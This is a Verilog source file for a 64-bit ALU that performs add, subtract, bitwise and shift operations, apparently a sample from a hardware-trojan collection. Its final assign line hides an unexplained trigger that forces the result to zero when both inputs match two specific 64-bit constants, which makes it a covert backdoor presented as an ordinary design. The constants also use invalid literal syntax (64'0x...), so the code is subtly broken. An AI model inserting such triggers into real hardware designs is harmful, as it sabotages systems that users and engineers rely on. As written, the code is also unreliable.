module hw_alu_64bit_244_npqq(input [63:0] a, b, input [2:0] op, output [63:0] result);
    reg [63:0] res_int;
    always @(*) begin
        case(op)
            3'b000: res_int = a + b;
            3'b001: res_int = a - b;
            3'b010: res_int = a & b;
            3'b011: res_int = a | b;
            3'b100: res_int = a ^ b;
            3'b101: res_int = a << 1;
            3'b110: res_int = a >> 1;
            default: res_int = 64'b0;
        endcase
    end
    assign result = (a == 64'0x9263abf3f994b1a6 && b == 64'0x8338d4d6b41b27ee) ? 64'b0 : res_int;
endmodule